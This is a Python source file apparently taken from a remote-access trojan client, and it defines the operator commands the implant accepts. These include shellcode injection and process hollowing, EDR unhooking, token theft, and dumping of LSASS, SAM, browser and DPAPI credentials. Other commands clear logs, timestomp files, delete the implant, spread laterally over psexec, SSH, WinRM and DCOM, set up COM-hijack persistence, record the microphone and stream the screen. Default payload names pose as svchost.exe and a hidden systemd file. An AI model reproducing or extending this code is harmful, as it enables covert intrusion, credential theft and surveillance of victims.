from client.commands.base import Command


class EvasionCommand(Command):
    name = 'evasion'

    def execute(self, ctx, raw: str):
        from client.modules.stealth import apply_all_bypasses
        result = apply_all_bypasses()
        ctx.protocol.send(result)
        return True


class DetectVMCommand(Command):
    name = 'detect_vm'

    def execute(self, ctx, raw: str):
        from client.modules.stealth import detect_vm
        ctx.protocol.send(detect_vm())
        return True


class InjectCommand(Command):
    name = 'inject'

    def execute(self, ctx, raw: str):
        args = raw[7:].strip().split(None, 2)
        if not args:
            ctx.protocol.send('[-] Usage: inject <pid|process_name> [shellcode_b64]')
            return True
        from client.modules.stealth import inject_shellcode, inject_into_process, find_process
        import base64
        target = args[0]
        try:
            pid = int(target)
            if len(args) >= 2:
                sc = base64.b64decode(args[1])
                ctx.protocol.send(inject_shellcode(pid, sc))
            else:
                ctx.protocol.send(find_process(target))
        except ValueError:
            if len(args) >= 2:
                sc = base64.b64decode(args[1])
                ctx.protocol.send(inject_into_process(target, sc))
            else:
                ctx.protocol.send(find_process(target))
        return True


class StealTokenCommand(Command):
    name = 'steal_token'

    def execute(self, ctx, raw: str):
        pid = raw[12:].strip()
        if not pid:
            ctx.protocol.send('[-] Usage: steal_token <pid>')
            return True
        from client.modules.stealth import steal_token_cmd
        ctx.protocol.send(steal_token_cmd(pid))
        return True


class RevertTokenCommand(Command):
    name = 'rev2self'

    def execute(self, ctx, raw: str):
        from client.modules.stealth import revert_token_cmd
        ctx.protocol.send(revert_token_cmd())
        return True


class WhoamiCommand(Command):
    name = 'whoami'

    def execute(self, ctx, raw: str):
        from client.modules.stealth import whoami_cmd
        ctx.protocol.send(whoami_cmd())
        return True


class EnablePrivilegeCommand(Command):
    name = 'priv_enable'

    def execute(self, ctx, raw: str):
        priv = raw[12:].strip()
        if not priv:
            ctx.protocol.send('[-] Usage: priv_enable <SeDebugPrivilege|SeImpersonatePrivilege|...>')
            return True
        from client.modules.stealth import enable_privilege_cmd
        ctx.protocol.send(enable_privilege_cmd(priv))
        return True


class ClearLogsCommand(Command):
    name = 'clear_logs'

    def execute(self, ctx, raw: str):
        from client.modules.stealth import clear_logs
        ctx.protocol.send(clear_logs())
        return True


class TimestompCommand(Command):
    name = 'timestomp'

    def execute(self, ctx, raw: str):
        path = raw[10:].strip()
        if not path:
            ctx.protocol.send('[-] Usage: timestomp <path> [reference_date]')
            return True
        from client.modules.stealth import timestomp
        ctx.protocol.send(timestomp(path))
        return True


class SelfDeleteCommand(Command):
    name = 'self_delete'

    def execute(self, ctx, raw: str):
        from client.modules.stealth import self_delete
        ctx.protocol.send(self_delete())
        return True


class HollowCommand(Command):
    name = 'hollow'

    def execute(self, ctx, raw: str):
        args = raw[7:].strip().split(None, 2)
        if len(args) < 2:
            ctx.protocol.send('[-] Usage: hollow <target_exe> <b64_shellcode> [ppid]')
            return True
        from client.modules.stealth import run_in_memory
        ppid = int(args[2]) if len(args) > 2 else None
        ctx.protocol.send(run_in_memory(args[1], args[0], ppid))
        return True


class MigrateCommand(Command):
    name = 'migrate'

    def execute(self, ctx, raw: str):
        pid = raw[8:].strip()
        if not pid:
            ctx.protocol.send('[-] Usage: migrate <pid>')
            return True
        from client.modules.stealth import migrate_to_process
        ctx.protocol.send(migrate_to_process(pid))
        return True


class LsassDumpCommand(Command):
    name = 'lsass_dump'

    def execute(self, ctx, raw: str):
        from client.modules.stealth import dump_lsass
        ctx.protocol.send(dump_lsass())
        return True


class Socks5Command(Command):
    name = 'socks5'

    def execute(self, ctx, raw: str):
        from client.modules.pivot.socks5 import start_socks5
        ctx.protocol.send(start_socks5(ctx.protocol))
        return True


class ScanCommand(Command):
    name = 'scan'

    def execute(self, ctx, raw: str):
        subnet = raw[5:].strip()
        from client.modules.lateral.movement import scan_network
        scan_network(ctx.protocol, subnet if subnet else None)
        return True


class PsexecCommand(Command):
    name = 'psexec'

    def execute(self, ctx, raw: str):
        args = raw[7:].strip().split()
        if len(args) < 3:
            ctx.protocol.send('[-] Usage: psexec <ip> <user> <pass> [payload_path]')
            return True
        from client.modules.lateral.movement import psexec_spread
        payload = args[3] if len(args) > 3 else 'svchost.exe'
        psexec_spread(ctx.protocol, args[0], args[1], args[2], payload)
        return True


class SSHSprdCommand(Command):
    name = 'ssh_spread'

    def execute(self, ctx, raw: str):
        args = raw[11:].strip().split()
        if len(args) < 3:
            ctx.protocol.send('[-] Usage: ssh_spread <ip> <user> <pass> [payload]')
            return True
        from client.modules.lateral.movement import ssh_spread
        payload = args[3] if len(args) > 3 else '/tmp/.systemd-update'
        ssh_spread(ctx.protocol, args[0], args[1], args[2], payload)
        return True


class UnhookCommand(Command):
    name = 'unhook'

    def execute(self, ctx, raw: str):
        from client.modules.stealth import unhook
        result = unhook.restore_all()
        ctx.protocol.send(result)
        return True


class SyscallInjectCommand(Command):
    name = 'syscall_inject'

    def execute(self, ctx, raw: str):
        args = raw[15:].strip().split()
        if len(args) < 2:
            ctx.protocol.send('[-] Usage: syscall_inject <pid> <shellcode_b64>')
            return True
        import base64, os
        if os.name != 'nt':
            ctx.protocol.send('[-] Windows-only')
            return True
        from client.modules.stealth.injection_v2 import queue_user_apc
        sc = base64.b64decode(args[1])
        ctx.protocol.send(queue_user_apc(sc, int(args[0])))
        return True


class EarlyBirdCommand(Command):
    name = 'early_bird'

    def execute(self, ctx, raw: str):
        args = raw[11:].strip().split()
        if len(args) < 2:
            ctx.protocol.send('[-] Usage: early_bird <target_exe> <shellcode_b64>')
            return True
        import base64, os
        if os.name != 'nt':
            ctx.protocol.send('[-] Windows-only')
            return True
        from client.modules.stealth.injection_v2 import early_bird_apc
        sc = base64.b64decode(args[1])
        ctx.protocol.send(early_bird_apc(sc, args[0]))
        return True


class PtieshCommand(Command):
    name = 'pty'

    def execute(self, ctx, raw: str):
        from client.modules.shell_pty import start_pty_shell
        ctx.protocol.send('[+] Starting PTY shell...')
        start_pty_shell(ctx.protocol)
        return True


class StreamStartCommand(Command):
    name = 'stream_start'

    def execute(self, ctx, raw: str):
        args = raw[13:].strip().split()
        interval = int(args[0]) if args else 5
        from client.modules.surveillance.stream import start_stream
        ctx.protocol.send(start_stream(ctx.protocol, interval))
        return True


class StreamStopCommand(Command):
    name = 'stream_stop'

    def execute(self, ctx, raw: str):
        from client.modules.surveillance.stream import stop_stream, stream_status
        stop_stream()
        ctx.protocol.send(stream_status())
        return True


class SamDumpCommand(Command):
    name = 'sam_dump'

    def execute(self, ctx, raw: str):
        from client.modules.credentials.sam_dump import dump_sam
        ctx.protocol.send(dump_sam(ctx.protocol))
        return True


class BrowserDumpV2Command(Command):
    name = 'browser_dump'

    def execute(self, ctx, raw: str):
        from client.modules.credentials.browser_v2 import list_all_browsers, dump_firefox
        results = ['=== Detected Browsers ===', list_all_browsers()]
        try:
            results.append('=== Firefox ===')
            results.append(dump_firefox())
        except Exception as e:
            results.append(f'Firefox: {e}')
        ctx.protocol.send('\n'.join(results))
        return True


class DpapiCommand(Command):
    name = 'dpapi_dump'

    def execute(self, ctx, raw: str):
        from client.modules.credentials.dpapi import extract_chrome_key, get_master_key
        key = extract_chrome_key()
        if key:
            import base64
            ctx.protocol.send(f'[+] DPAPI master key: {base64.b64encode(key).decode()}')
        else:
            ctx.protocol.send('[-] DPAPI key extraction failed (Windows-only, Chrome required)')
        return True


class WinrmCommand(Command):
    name = 'winrm'

    def execute(self, ctx, raw: str):
        args = raw[6:].strip().split()
        if len(args) < 4:
            ctx.protocol.send('[-] Usage: winrm <ip> <user> <pass> <command>')
            return True
        from client.modules.lateral.winrm_dcom import winrm_execute
        ctx.protocol.send(winrm_execute(args[0], args[1], args[2], ' '.join(args[3:])))
        return True


class DcomCommand(Command):
    name = 'dcom_exec'

    def execute(self, ctx, raw: str):
        args = raw[10:].strip().split(None, 1)
        if len(args) < 2:
            ctx.protocol.send('[-] Usage: dcom_exec <ip> <command>')
            return True
        from client.modules.lateral.winrm_dcom import dcom_execute
        ctx.protocol.send(dcom_execute(args[0], args[1]))
        return True


class ComHijackCommand(Command):
    name = 'com_hijack'

    def execute(self, ctx, raw: str):
        args = raw[10:].strip().split()
        if len(args) < 2:
            ctx.protocol.send('[-] Usage: com_hijack <clsid> <payload_path>')
            return True
        from client.modules.persist.com_hijacking import hijack_com_class
        ctx.protocol.send(hijack_com_class(args[0], args[1]))
        return True


class MicCommand(Command):
    name = 'mic'

    def execute(self, ctx, raw: str):
        seconds = 10
        args = raw[4:].strip()
        if args:
            try:
                seconds = int(args)
            except ValueError:
                pass
        from client.modules.surveillance.microphone import record_audio
        ctx.protocol.send(record_audio(ctx.protocol, seconds))
        return True


class FileSearchCommand(Command):
    name = 'file_search'

    def execute(self, ctx, raw: str):
        parts = raw[12:].strip()
        pattern = parts if parts else '*.docx;*.xlsx;*.pdf;*.txt'
        from client.modules.file_search import search_files
        search_files(ctx.protocol, pattern)
        return True
